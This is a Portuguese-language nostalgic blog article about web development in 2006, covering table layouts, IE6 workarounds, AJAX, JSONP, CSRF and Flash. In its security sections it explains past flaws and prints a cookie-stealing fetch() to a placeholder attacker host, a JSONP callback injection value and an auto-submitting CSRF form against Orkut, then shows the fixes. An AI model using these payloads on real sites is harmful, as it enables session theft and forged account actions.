---
title: "Como era programar pra web em 2006"
date: 2026-05-24
type: article
tags: [web, história, nostalgia, front-end, javascript, css, flash, internet explorer]
description: "Pra quem começou a programar depois de 2020, isso tudo soa como coisa velha. Pra quem estava lá, é pura nostalgia. Trouxe nesse artigo tudo que eu consegui lembrar, gambiarras, hacks, soluções criativas e os problemas de segurança."
cover: /blog/_content/programar-pra-web-em-2006/cover.png
coverAlt: "Captura de tela de um editor de código antigo com layout de tabelas HTML"
ogTitle: "Como era programar pra web em 2006"
draft: false
---

## O pipeline começava no CorelDraw

Layout era arquivo `.cdr`. O designer entregava um PSD do Photoshop ou um projeto do CorelDraw, e o programador precisava *fatiar* aquilo manualmente: recortar cada pedaço do layout como imagem separada, salvar como `.gif` ou `.jpg`, e montar tudo em HTML.

Fatiar era um processo literal. Você dividia o layout em células, exportava cada célula como imagem, e o HTML final era uma tabela onde cada célula carregava uma imagem de fundo ou um `<img src>`.

O resultado visualmente era convincente. Tecnicamente era um mosaico de imagens costuradas por `<table>`.

![Interface do CorelDraw com layout sendo fatiado em células](/blog/_content/programar-pra-web-em-2006/coreldraw.jpg)

---

## Dreamweaver e FrontPage: os IDEs da época

![Interface do Macromedia Dreamweaver MX com painel de design e código](/blog/_content/programar-pra-web-em-2006/dreamweaver.jpg)

O Dreamweaver tinha um modo visual onde você arrastava elementos e ele gerava o HTML por baixo. A maioria das pessoas usava o modo WYSIWYG e nunca abria o código-fonte. Os que abriam encontravam algo assim:

```html
<table width="780" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="200" valign="top">
      <table width="200" border="0" cellspacing="0" cellpadding="5">
        <tr>
          <td><img src="menu_topo.gif" width="200" height="30"></td>
        </tr>
        <tr>
          <td><a href="sobre.html">Sobre nós</a></td>
        </tr>
        <tr>
          <td><a href="contato.html">Contato</a></td>
        </tr>
      </table>
    </td>
    <td width="580" valign="top">
      <table width="580" border="0" cellspacing="0" cellpadding="10">
        <tr>
          <td><h1>Bem-vindo ao site</h1></td>
        </tr>
      </table>
    </td>
  </tr>
</table>
```

Tabelas dentro de tabelas dentro de tabelas. Aninhamento de quatro, cinco níveis era padrão. Era a única forma de controlar posicionamento com precisão entre browsers diferentes.

O Microsoft FrontPage era a versão mais popular entre quem não era desenvolvedor de verdade. Ele gerava HTML ainda mais confuso: cheio de comentários proprietários e extensões `.asp` automáticas que dependiam de componentes instalados no IIS. Migrar um site feito no FrontPage pra outro servidor às vezes quebrava tudo.

*Fontes: [Macromedia Dreamweaver MX](https://en.wikipedia.org/wiki/Adobe_Dreamweaver) — Wikipedia; [Microsoft FrontPage](https://en.wikipedia.org/wiki/Microsoft_FrontPage) — Wikipedia*

---

## Tabela no lugar de `<div>`

`<div>` existia, mas CSS ainda não era confiável o suficiente pra posicionamento. `float` quebrava no IE. `position: absolute` se comportava diferente em cada browser. A solução era a tabela, porque `<td>` tinha comportamento de célula que todo browser respeitava da mesma forma.

```html
<!-- layout de três colunas em 2006 -->
<table width="100%" cellspacing="0" cellpadding="0">
  <tr>
    <td width="160" valign="top" bgcolor="#f0f0f0">
      <!-- menu lateral -->
    </td>
    <td width="20">
      <!-- espaçamento -->
      <img src="spacer.gif" width="20" height="1">
    </td>
    <td valign="top">
      <!-- conteúdo principal -->
    </td>
  </tr>
</table>
```

O `spacer.gif` era uma imagem GIF transparente de 1x1 pixel usada como espaçador. Antes do CSS ser confiável, era a forma de forçar células vazias a terem dimensão.

O layout baseado em tabelas não era preguiça. Era pragmatismo. CSS 2.1 era especificação; os browsers eram realidade.

*Fonte: [Why tables for layout is stupid](https://www.hotdesign.com/seybold/everything.html) — artigo de 2003 que ajudou a mudar a mentalidade da indústria*

---

## `<font face>`: tipografia direto no HTML

Antes do CSS ser confiável para texto, o controle de fonte era feito com a tag `<font>` inline no HTML. O atributo `face` especificava a família tipográfica, `size` ia de 1 a 7, e `color` definia a cor.

```html
<font face="Arial, Helvetica, sans-serif" size="4" color="#333333">
  Texto no corpo da página
</font>

<font face="Comic Sans MS, Cursive" size="5" color="#ff0000">
  Título chamativo
</font>

<!-- combinação típica: fonte, tamanho e cor repetidos em cada bloco -->
<table width="780" cellpadding="5">
  <tr>
    <td>
      <font face="Verdana, Arial" size="2" color="#666666">
        <b>Produto:</b> Notebook Dell Inspiron<br>
        <b>Preço:</b> <font color="#cc0000">R$ 2.499,00</font><br>
        <font size="1">* Preço válido até 31/12/2006</font>
      </font>
    </td>
  </tr>
</table>
```

A tag `<font>` se repetia em volta de cada bloco de texto, cada parágrafo, cada célula. Uma página com 50 parágrafos tinha 50 pares de `<font>`. Se o design mudasse, o desenvolvedor alterava cada um manualmente.

As fontes disponíveis eram apenas as instaladas no computador do usuário. O atributo `face` funcionava como uma lista de fallbacks: `"Arial, Helvetica, sans-serif"` significava tentar Arial primeiro, se não estivesse instalada usar Helvetica, se não houvesse nenhuma das duas, usar a sans-serif padrão do sistema. Não havia garantia de que o usuário via a mesma fonte que o designer.

O CSS1 já tinha `font-family`, `font-size` e `color` desde 1996, mas o suporte nos browsers era irregular. A transição de `<font>` para CSS aconteceu gradualmente entre 2004 e 2008. O HTML 4.01 marcou a tag como obsoleta em 1997. Na prática, a indústria continuou usando por anos depois disso.

*Fontes: [font element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/font) — MDN Web Docs; [HTML 4.01 Specification](https://www.w3.org/TR/html401/present/graphics.html#h-15.2) — W3C*

---

## Não existia DevTools. Não existia Chrome.

O Firefox lançou em 2004. Em 2006, estava na segunda versão. O plugin que mudou tudo foi o **Firebug**, lançado em março de 2006: o primeiro inspetor de elementos real, console JavaScript, e painel de rede.

![Interface do Firebug no Firefox mostrando inspetor de elementos e console](/blog/_content/programar-pra-web-em-2006/firebug.png)

Antes do Firebug, o processo de debug era esse:

```javascript
// sem console.log, sem breakpoints — só alert()
function calcularTotal(itens) {
  alert('entrou na função');
  alert('itens: ' + itens.length);

  var total = 0;
  for (var i = 0; i < itens.length; i++) {
    alert('item ' + i + ': ' + itens[i].preco);
    total += itens[i].preco;
  }

  alert('total final: ' + total);
  return total;
}
```

Você não via a tela enquanto debugava. Adicionava `alert()` em vários pontos, recarregava a página, clicava OK em cada popup, e deduzia o problema pela sequência de alertas.

O Chrome só nasceu em 2008. Em 2006, os browsers disponíveis eram Internet Explorer 6, Firefox 2, Opera 9 e Safari, que quase ninguém usava fora do Mac.

O IE6 tinha mais de 80% do market share. Você tinha que funcionar no IE6. Não existia a opção de ignorar.

*Fontes: [Firebug](https://en.wikipedia.org/wiki/Firebug_(software)) — Wikipedia; [Browser statistics 2006](https://www.w3schools.com/browsers/browsers_stats.asp) — W3Schools histórico*

---

## GitHub não existia: Pastebin era o repositório

O GitHub foi fundado em 2008. O SourceForge existia desde 1999 e hospedava projetos open source grandes, mas era burocrático: criar um projeto exigia aprovação, configuração de repositório CVS ou SVN, e uma página de projeto formal. Ninguém abria o SourceForge pra compartilhar um snippet de código numa conversa de fórum.

O **Pastebin** foi fundado em 2002 exatamente pra isso.

![Interface do Pastebin mostrando campo de texto para colar código com opções de syntax highlight](/blog/_content/programar-pra-web-em-2006/pastebin.png)

Quando alguém no fórum dizia *"me manda teu código"*, a resposta era um link do Pastebin. Você colava o código, escolhia a linguagem pra syntax highlight, e recebia uma URL única. Sem conta, sem cadastro, sem repositório.

```
https://pastebin.com/aB3xK9mZ
```

Era o equivalente a um repositório de um arquivo, com uma URL descartável. Não tinha histórico de versão, não tinha diff, não tinha pull request. Se você atualizava o código, criava um novo paste e mandava o link novo.

Os fóruns da época, como o **iMasters** no Brasil e o **SitePoint** internacionalmente, tinham threads de ajuda onde a troca de código era inteiramente feita por links de Pastebin. O código no link podia expirar depois de um mês ou uma semana dependendo da configuração escolhida, e as discussões técnicas ficavam com metade do contexto perdido.

Antes do GitHub, código open source vivia no SourceForge ou fragmentado em pastes descartáveis no Pastebin que expiravam em semanas.

*Fontes: [Pastebin](https://en.wikipedia.org/wiki/Pastebin) — Wikipedia; [SourceForge](https://en.wikipedia.org/wiki/SourceForge) — Wikipedia; [GitHub](https://en.wikipedia.org/wiki/GitHub) — Wikipedia*

---

## `<!--[if IE 6]>`

O Internet Explorer tinha um mecanismo chamado *conditional comments*. HTML que só o IE lia, os outros browsers tratavam como comentário normal:

```html
<!--[if IE 6]>
  <link rel="stylesheet" href="ie6-fixes.css" />
<![endif]-->

<!--[if lt IE 7]>
  <div class="aviso-browser">
    <p>Você está usando o Internet Explorer 6.</p>
    <p><a href="http://www.getfirefox.com">Baixe o Firefox</a></p>
  </div>
<![endif]-->

<!--[if gte IE 7]>
  <p>IE 7 ou superior detectado.</p>
<![endif]-->
```

Os operadores eram: `lt` (less than), `lte` (less than or equal), `gt`, `gte`, e `!` (negação). Ter um arquivo `ie6-fixes.css` no projeto era padrão da indústria. Às vezes esse arquivo era maior que o CSS principal.

O IE6 não entendia `min-height`, não entendia `max-width`, não renderizava `position: fixed`, e tinha o famoso *double margin bug*: um elemento com `float: left; margin-left: 10px` renderizava `20px` de margem. A correção era adicionar `display: inline` no elemento com float, o que tecnicamente não fazia sentido, mas resolvia o bug.

```css
/* ie6-fixes.css */
.sidebar {
  display: inline; /* corrige double margin bug no IE6 */
  float: left;
  width: 200px;
  margin-left: 10px;
}

.container {
  height: 400px; /* IE6 não entende min-height, height vira min-height por bug */
}
```

*Fonte: [Conditional comments](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/ms537512(v=vs.85)) — Microsoft Developer Network (arquivado)*

---

## CSS Reset

Cada browser tinha seus próprios estilos padrão. `<h1>` tinha tamanho diferente no Firefox e no IE. `<ul>` tinha padding diferente. `<body>` tinha margem diferente. Nenhum valor padrão era igual entre browsers.

A solução foi o **CSS Reset**, popularizado por Eric Meyer em 2007:

```css
/* Meyer Reset v1.0 */
html, body, div, span, h1, h2, h3, h4, h5, h6, p,
blockquote, pre, a, abbr, acronym, address, big, cite,
code, del, dfn, em, img, ins, kbd, q, s, samp, small,
strike, strong, sub, sup, tt, var, b, u, i, center,
dl, dt, dd, ol, ul, li, fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td {
  margin: 0;
  padding: 0;
  border: 0;
  font-size: 100%;
  font: inherit;
  vertical-align: baseline;
}

body {
  line-height: 1;
}

ol, ul {
  list-style: none;
}

table {
  border-collapse: collapse;
  border-spacing: 0;
}
```

Você adicionava isso no começo de todo projeto e começava do zero. Era um ritual. A alternativa moderna, `normalize.css`, só surgiu em 2011, com uma filosofia diferente: em vez de zerar tudo, normalizar os valores pra que fossem iguais entre browsers, preservando os úteis.

*Fontes: [Eric Meyer's CSS Reset](https://meyerweb.com/eric/tools/css/reset/) — meyerweb.com; [normalize.css](https://necolas.github.io/normalize.css/) — necolas.github.io*

---

## `float` e `clear: both`

CSS moderno tem `flexbox` e `grid`. Em 2006, posicionamento horizontal era feito com `float`, uma propriedade criada originalmente pra texto fluir ao redor de imagens.

```css
.sidebar {
  float: left;
  width: 200px;
  background: #f0f0f0;
}

.conteudo {
  float: left;
  width: 580px;
  padding: 0 10px;
}

/* sem isso, o container colapsava para altura zero */
.container:after {
  content: '';
  display: table;
  clear: both;
}
```

O problema: elementos com `float` saem do fluxo normal do documento. O container pai não enxerga a altura dos filhos flutuantes e *colapsava*, ficava com `height: 0` mesmo com conteúdo dentro.

A versão mais arcaica do clearfix era um elemento HTML explícito:

```html
<div class="sidebar"><!-- menu --></div>
<div class="conteudo"><!-- texto --></div>
<div style="clear: both;"></div> <!-- resolvedor de float -->
```

A `<div>` vazia com `clear: both` forçava o layout a reconhecer os elementos flutuantes acima. Quem nunca adicionou esse elemento vazio no HTML, nunca montou layout em 2006.

*Fonte: [CSS float property](https://developer.mozilla.org/en-US/docs/Web/CSS/float) — MDN Web Docs*

---

## Setas feitas com `border`

CSS não tinha suporte a ícones vetoriais. SVG inline não era prático. Pra fazer uma seta ou triângulo decorativo, a solução era explorar um comportamento específico de bordas em elementos com tamanho zero:

![Demonstração de triângulos CSS feitos com border em diferentes direções](/blog/_content/programar-pra-web-em-2006/triangle.gif)

```css
/* triângulo apontando pra direita */
.seta-direita {
  width: 0;
  height: 0;
  border-top: 10px solid transparent;
  border-bottom: 10px solid transparent;
  border-left: 10px solid #333;
}

/* triângulo apontando pra baixo */
.seta-baixo {
  width: 0;
  height: 0;
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-top: 10px solid #333;
}

/* balão de fala */
.balao {
  position: relative;
  background: #f0f0f0;
  padding: 10px;
}

.balao:after {
  content: '';
  position: absolute;
  bottom: -10px;
  left: 20px;
  width: 0;
  height: 0;
  border-left: 8px solid transparent;
  border-right: 8px solid transparent;
  border-top: 10px solid #f0f0f0;
}
```

Um elemento com dimensão zero e bordas coloridas nas laterais forma um triângulo por causa de como as bordas se encontram nos cantos. Todo blog de front-end de 2008 tinha um tutorial sobre isso. Era considerado conhecimento avançado de CSS.

*Fonte: [CSS Triangles](https://css-tricks.com/snippets/css/css-triangle/) — CSS-Tricks (artigo de 2009, ainda online)*

---

## Prefixos de vendor: `-webkit-`, `-moz-`, `-o-`

CSS3 estava sendo implementado pelos browsers, mas cada um implementava do seu jeito, antes da especificação finalizar. A solução foram os *vendor prefixes*: você escrevia a mesma propriedade quatro vezes.

```css
.caixa {
  /* border-radius */
  -webkit-border-radius: 8px; /* Safari, Chrome */
  -moz-border-radius: 8px;    /* Firefox */
  border-radius: 8px;         /* padrão (IE9+) */
}

.gradiente {
  /* linear-gradient */
  background: -webkit-linear-gradient(top, #ffffff, #cccccc);
  background: -moz-linear-gradient(top, #ffffff, #cccccc);
  background: -o-linear-gradient(top, #ffffff, #cccccc);   /* Opera */
  background: linear-gradient(to bottom, #ffffff, #cccccc);
}

.transicao {
  /* transition */
  -webkit-transition: all 0.3s ease;
  -moz-transition: all 0.3s ease;
  -o-transition: all 0.3s ease;
  transition: all 0.3s ease;
}

.transformacao {
  /* transform */
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  -ms-transform: rotate(45deg); /* IE9 */
  transform: rotate(45deg);
}
```

`-webkit-` para Safari e depois Chrome. `-moz-` para Firefox. `-o-` para Opera. `-ms-` para IE. Esquecer um prefixo significava que o efeito não aparecia num browser específico.

Ferramentas como o **Autoprefixer** surgiram anos depois exatamente pra automatizar isso. Em 2006, você adicionava na mão.

*Fonte: [Vendor Prefix](https://developer.mozilla.org/en-US/docs/Glossary/Vendor_Prefix) — MDN Web Docs*

---

## `PIE.htc`: JavaScript embutido no CSS pra salvar o IE

O IE8 não entendia `border-radius`. Não entendia `box-shadow`. Não entendia gradientes CSS. Não tinha prefixo que resolvesse, o IE simplesmente não implementou.

A solução era o **CSS3 PIE** (Progressive Internet Explorer), um arquivo `.htc` referenciado no próprio CSS:

```css
/* CSS normal */
.caixa-arredondada {
  border-radius: 8px;
  box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
  background: linear-gradient(to bottom, #fff, #ddd);

  /* ativa o PIE no IE */
  behavior: url(/assets/PIE.htc);
}
```

`.htc` é *HTML Component*, um formato proprietário da Microsoft. Era JavaScript com extensão diferente, que o IE carregava ao encontrar a propriedade `behavior` no CSS.

O `PIE.htc` interceptava o elemento e o redesenhava usando **VML** (Vector Markup Language), outro formato proprietário que o IE entendia nativamente. O arquivo `.htc` precisava ser servido pelo servidor com o MIME type correto (`text/x-component`), senão o IE ignorava:

```
# Apache .htaccess
AddType text/x-component .htc
```

Era JavaScript sendo invocado por CSS pra simular CSS que o browser não sabia renderizar. E funcionava, exceto nos casos em que o elemento estava dentro de um container com `overflow: hidden`, onde o VML vazava pra fora dos limites.

Hoje isso tem nome: **polyfill**. Um script que implementa funcionalidade que o browser ainda não suporta, de forma transparente pra quem usa. A palavra foi cunhada por Remy Sharp em 2009. Mas a prática existia antes disso, o `PIE.htc` era um polyfill em 2006, antes de ter nome, com um arquivo `.htc` servindo por MIME type específico e VML desenhando bordas arredondadas debaixo do pano. Polyfill? A gente usava `PIE.htc`.

*Fonte: [CSS3 PIE](https://github.com/dennybiasiolli/CSS3-PIE/tree/master) — GitHub*

---

## PNG transparente quebrava no IE6

PNG com canal alpha funcionava em todo browser. No IE6, a transparência virava um fundo cinza sólido horrível. O motivo era que o IE6 usava um mecanismo antigo de renderização que não suportava o canal alpha do PNG.

A solução era um filtro ActiveX proprietário da Microsoft:

```css
/* CSS normal (funciona em tudo, menos IE6) */
.logo {
  background: url(logo.png) no-repeat;
}

/* correção manual pro IE6 */
.logo {
  filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(
    src='logo.png',
    sizingMethod='scale'
  );
  background: none; /* remove o background normal */
}
```

O `filter: progid:` invocava um componente COM da Microsoft por nome. Você literalmente chamava código compilado dentro do CSS. `sizingMethod='scale'` fazia a imagem se esticar pra preencher o elemento; `crop` cortava; `image` usava o tamanho original.

A versão automatizada disso era o script **iepngfix**, um `.htc` que percorria todos os elementos da página e aplicava o filtro em cada imagem PNG:

```html
<!--[if IE 6]>
<style>
  img, .png-fix {
    behavior: url(iepngfix.htc);
  }
</style>
<![endif]-->
```

*Fonte: [AlphaImageLoader filter](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms532969(v=vs.85)) — Microsoft Developer Network (arquivado)*

---

## AJAX sem `fetch`: `ActiveXObject` e `try/catch`

`fetch()` só chegou em 2015. `XMLHttpRequest` existia desde 2000, mas no IE era um objeto ActiveX, não nativo do browser. Fazer uma requisição assíncrona em 2006 requeria três níveis de `try/catch`:

```javascript
function criarXHR() {
  var xhr;

  try {
    // Firefox, Opera, Safari, IE7+
    xhr = new XMLHttpRequest();
  } catch (e) {
    try {
      // IE6, IE5.5
      xhr = new ActiveXObject('Msxml2.XMLHTTP');
    } catch (e) {
      try {
        // IE5
        xhr = new ActiveXObject('Microsoft.XMLHTTP');
      } catch (e) {
        xhr = null;
      }
    }
  }

  return xhr;
}

function fazerRequisicao(url, callback) {
  var xhr = criarXHR();
  if (!xhr) return;

  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        callback(null, xhr.responseText);
      } else {
        callback('Erro: ' + xhr.status);
      }
    }
  };

  xhr.open('GET', url, true);
  xhr.send(null);
}

fazerRequisicao('/dados.php', function(erro, resposta) {
  if (erro) {
    alert('Deu erro: ' + erro);
    return;
  }
  document.getElementById('resultado').innerHTML = resposta;
});
```

`Msxml2.XMLHTTP` era a versão mais recente do componente no IE6. `Microsoft.XMLHTTP` era o fallback pra versões mais antigas. As três variantes existiam porque diferentes versões do IE tinham diferentes versões do componente COM instaladas.

jQuery popularizou o `$.ajax()` exatamente porque escondia essa lógica. Quem não usava jQuery escrevia esse bloco em todo projeto.

*Fontes: [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) — MDN Web Docs; [AJAX: A New Approach to Web Applications](https://adaptivepath.org/ideas/ajax-new-approach-web-applications/) — Jesse James Garrett, 2005 (artigo que cunhou o termo)*

---

## `eval()` pra parsear JSON

`JSON.parse()` só chegou no ECMAScript 5, em 2009. Antes disso, não havia API nativa pra transformar uma string JSON em objeto JavaScript. A solução padrão era passar a string direto pro `eval()`:

```javascript
function fazerRequisicao(url, callback) {
  var xhr = criarXHR();
  if (!xhr) return;

  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      // eval executa a string como código JavaScript
      // os parênteses externos são necessários: sem eles, { } é lido
      // como bloco de código, não como objeto literal
      var dados = eval('(' + xhr.responseText + ')');
      callback(dados);
    }
  };

  xhr.open('GET', url, true);
  xhr.send(null);
}

fazerRequisicao('/api/usuario.php', function(dados) {
  alert(dados.nome);
});
```

Funcionava porque JSON é um subconjunto de JavaScript. Um objeto JSON válido é também uma expressão JavaScript válida, então `eval()` conseguia avaliar e retornar o objeto. Os parênteses externos não eram decoração: sem eles, o `{` era interpretado como início de bloco de código e o `eval` lançava `SyntaxError`.

O problema não era sutil. Se o servidor retornasse qualquer string que não fosse JSON puro, seja por bug, por injeção de dados do banco, ou por um atacante que controlasse o conteúdo da resposta, o `eval()` executava tudo:

```javascript
// resposta legítima do servidor:
// {"nome": "João", "email": "joao@exemplo.com"}

// resposta se um atacante controlasse o campo nome no banco de dados:
// {"nome": "x\"; fetch('https://atacante.com?c='+document.cookie);//", "email": "..."}

// eval executava o fetch e vazava os cookies de sessão
var dados = eval('(' + xhr.responseText + ')');
```

Era execução arbitrária de código com a superfície de ataque sendo qualquer dado que chegasse pelo servidor. Se o banco estava comprometido, se havia uma falha de injeção em qualquer campo, o `eval()` no cliente transformava isso em XSS automático.

O jQuery usava `eval()` internamente no `$.ajax()` com `dataType: 'json'` até a versão 1.4, lançada em 2010, quando migrou para `JSON.parse()`. Pra suportar browsers mais antigos que não tinham `JSON.parse` nativo, a prática era incluir o **json2.js** de Douglas Crockford, uma implementação manual que validava a string via regex antes de chamar `eval()`. Crockford criou o formato JSON em 2001 e escreveu o json2.js exatamente porque `eval()` puro era perigoso demais. Mas muita gente usava o `eval()` direto sem o shim.

Hoje `eval()` em produção é tratado como code smell imediato. CSP (Content Security Policy) pode bloquear `eval()` por completo. Em 2006, era o jeito normal de fazer as coisas.

*Fontes: [JSON.parse](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse) — MDN Web Docs; [json2.js](https://github.com/douglascrockford/JSON-js) — Douglas Crockford, GitHub; [ECMAScript 5 spec](https://www.ecma-international.org/publications-and-standards/standards/ecma-262/) — Ecma International*

---

## CORS não existia: JSONP

Requisição cross-origin era bloqueada na origem: a *same-origin policy* impedia que uma página em `meusite.com.br` fizesse `XMLHttpRequest` para `api.outrosite.com`. Não existia CORS, não existia nenhuma forma oficial de liberar isso.

A solução foi o **JSONP** (JSON with Padding). A restrição não se aplicava a `<script src="">`. Você carregava um script externo, e o servidor retornava uma chamada de função em vez de JSON puro:

```javascript
// cliente: define a função de callback antes de carregar o script
function receberDados(dados) {
  document.getElementById('nome').innerHTML = dados.nome;
  document.getElementById('email').innerHTML = dados.email;
}

// cliente: injeta um <script> dinamicamente com o callback no parâmetro
var script = document.createElement('script');
script.src = 'https://api.outrosite.com/usuario?id=42&callback=receberDados';
document.head.appendChild(script);
```

```php
<?php
// servidor: lê o parâmetro callback e envolve o JSON
$callback = $_GET['callback'];
$dados = array('nome' => 'João', 'email' => 'joao@exemplo.com');

header('Content-Type: application/javascript');
echo $callback . '(' . json_encode($dados) . ');';
// saída: receberDados({"nome":"João","email":"joao@exemplo.com"});
?>
```

O browser executa o script retornado e a função `receberDados` é chamada com os dados. Era gambiarra técnica elevada a protocolo, e tinha um problema sério de segurança: você estava executando código JavaScript arbitrário de um domínio externo sem nenhuma validação.

O jQuery abstraiu todo esse processo com `$.ajax()` usando `dataType: 'jsonp'`:

```javascript
// jQuery gerava o nome do callback automaticamente
// e criava/removia o <script> por conta própria
$.ajax({
  url: 'https://api.outrosite.com/usuario',
  dataType: 'jsonp',
  data: { id: 42 },
  success: function(dados) {
    $('#nome').text(dados.nome);
    $('#email').text(dados.email);
  }
});

// atalho: $.getJSON com callback=? na URL
// o jQuery substituía o ? por um nome gerado (ex: jQuery21408_1234567890)
$.getJSON('https://api.outrosite.com/usuario?id=42&callback=?', function(dados) {
  $('#nome').text(dados.nome);
});
```

O jQuery gerava um nome único pra função de callback (algo como `jQuery21408_1234567890`), injetava o `<script>`, e depois de executar, removia o elemento do DOM e apagava a função global. O servidor precisava suportar qualquer nome de callback, não apenas um fixo:

```php
<?php
// servidor adaptado pra qualquer nome de callback
$callback = $_GET['callback']; // recebe "jQuery21408_1234567890" ou qualquer string
$dados = array('nome' => 'João', 'email' => 'joao@exemplo.com');

// validação básica: callback deve conter apenas caracteres válidos
if (!preg_match('/^[a-zA-Z0-9_\$\.]+$/', $callback)) {
    http_response_code(400);
    exit;
}

header('Content-Type: application/javascript');
echo $callback . '(' . json_encode($dados) . ');';
?>
```

A validação do nome do callback era crítica: sem ela, um atacante podia injetar `callback=alert(document.cookie)//` e transformar o endpoint em vetor de XSS. Muitas APIs da época não faziam essa validação.

A especificação do CORS ficou estável em 2014. Muitas APIs antigas mantiveram suporte a JSONP mesmo depois disso.

*Fontes: [JSONP](https://en.wikipedia.org/wiki/JSONP) — Wikipedia; [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) — MDN Web Docs; [jQuery.ajax() dataType jsonp](https://api.jquery.com/jQuery.ajax/) — jQuery API Documentation*

---

## CSRF: a falha que ninguém sabia que existia

Em 2006, nenhum site implementava proteção contra **Cross-Site Request Forgery**. O conceito existia desde 2001, documentado por Peter Watkins num post de fórum, mas era completamente desconhecido na prática. O OWASP só incluiu CSRF no Top 10 em 2007. Até lá, ninguém validava origem de requisição nenhuma.

O problema: um formulário HTML pode ser hospedado em qualquer domínio e submeter para qualquer outro domínio. O browser inclui os cookies de sessão automaticamente, porque é assim que cookies funcionam. O servidor não tem como distinguir se a requisição veio do próprio site ou de uma página maliciosa em outro domínio.

Uma nota técnica importante: HTML só suporta `method="get"` e `method="post"` em formulários. Qualquer outro valor era ignorado e o browser enviava como GET. Mas isso não importava. Os sites da época não usavam DELETE, PUT, PATCH. Deletar uma conta era um POST ou até um GET simples para uma URL como `/conta/deletar`. A restrição de métodos não protegia nada.

Uma página com esse HTML, ao ser acessada, disparava automaticamente uma requisição autenticada para o Orkut:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Clique aqui para ganhar Orkut Premium!</title>
</head>
<body>

  <!-- formulário invisível apontando para a ação de deletar conta do Orkut -->
  <form id="csrf-form"
        action="https://www.orkut.com/DeleteProfile"
        method="post">
    <input type="hidden" name="uid" value="VITIMA_ID">
    <input type="hidden" name="confirm" value="1">
  </form>

  <script>
    // executa imediatamente ao carregar a página
    document.getElementById('csrf-form').submit();
  </script>

</body>
</html>
```

O browser da vítima enviava a requisição POST para `orkut.com` com os cookies de sessão dela, porque a sessão estava ativa no browser. O Orkut recebia uma requisição autenticada válida e executava a ação. Do ponto de vista do servidor, era indistinguível de uma ação legítima do usuário.

Para ações que usavam GET, era mais simples ainda, bastava uma tag `<img>`:

```html
<!-- sem JavaScript, sem formulário — o browser carrega a imagem e dispara a requisição -->
<img src="https://www.orkut.com/DeleteProfile?uid=VITIMA_ID&confirm=1"
     width="1" height="1">
```

O browser tentava carregar a imagem, disparava o GET autenticado, e o Orkut executava. A vítima não via nada.

A correção, que só foi amplamente adotada depois do OWASP documentar o problema, era o **token CSRF**: um valor aleatório gerado pelo servidor, embutido em todo formulário como campo oculto, e validado no recebimento:

```php
<?php
// servidor: gera token na sessão
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>

<!-- formulário legítimo inclui o token -->
<form action="/conta/deletar" method="post">
  <input type="hidden" name="csrf_token"
         value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
  <button type="submit">Deletar conta</button>
</form>
```

```php
<?php
// servidor: valida na ação
session_start();
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    http_response_code(403);
    exit('Token inválido');
}
// processa a ação
```

A página maliciosa não tem como descobrir o token, porque está em outro domínio e a same-origin policy impede que JavaScript de `meusite.com` leia o conteúdo de páginas do `orkut.com`. Sem o token, a requisição forjada falha na validação.

Em 2006, nenhum desses tokens existia. Nenhuma validação de `Referer`. Nenhum `SameSite` nos cookies (esse atributo só chegou em 2016). Qualquer ação que o usuário pudesse fazer no seu site, um atacante podia fazer por ele.

*Fontes: [Cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery) — Wikipedia; [CSRF (OWASP)](https://owasp.org/www-community/attacks/csrf) — OWASP; [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value) — MDN Web Docs*

---

## Flash e ActionScript: o que o HTML não podia fazer

Em 2006, Flash era a única forma de ter animações fluidas, áudio, vídeo e interações ricas na web. O YouTube foi lançado em 2005 usando Flash. Toda intro de site usava Flash.

O fluxo de trabalho:
1. Escrever ActionScript no Flash IDE (ou Flex)
2. Compilar para `.swf`
3. Incorporar na página com `<object>` e `<embed>`

```html
<!-- o duplo object/embed era necessário:
     IE usava classid (ActiveX), outros browsers usavam type (MIME) -->
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
        codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0"
        width="800" height="600" id="minha-animacao">
  <param name="movie" value="animacao.swf">
  <param name="quality" value="high">
  <param name="allowScriptAccess" value="sameDomain">
  <embed src="animacao.swf"
         type="application/x-shockwave-flash"
         width="800" height="600"
         quality="high"
         allowScriptAccess="sameDomain"
         name="minha-animacao">
  </embed>
</object>
```

**Copiar para o clipboard** era algo que JavaScript simplesmente não podia fazer. Browsers bloqueavam por segurança. A solução padrão da indústria era um `.swf` de um pixel, invisível, posicionado sobre um botão HTML. JavaScript chamava uma função exposta pelo Flash:

```javascript
// JavaScript chamava a função exposta pelo Flash
function copiarTexto(texto) {
  var swf = document.getElementById('clipboard-helper');
  swf.copiarParaClipboard(texto);
}
```

```actionscript
// ActionScript dentro do .swf
import flash.system.System;

// função chamável pelo JavaScript via ExternalInterface
ExternalInterface.addCallback('copiarParaClipboard', copiarParaClipboard);

function copiarParaClipboard(texto:String):void {
  System.setClipboard(texto);
}
```

Isso não era hack. Era o jeito oficial recomendado. O GitHub usava Flash pra copiar o URL do repositório até 2012. O Flash Player foi oficialmente descontinuado em dezembro de 2020.

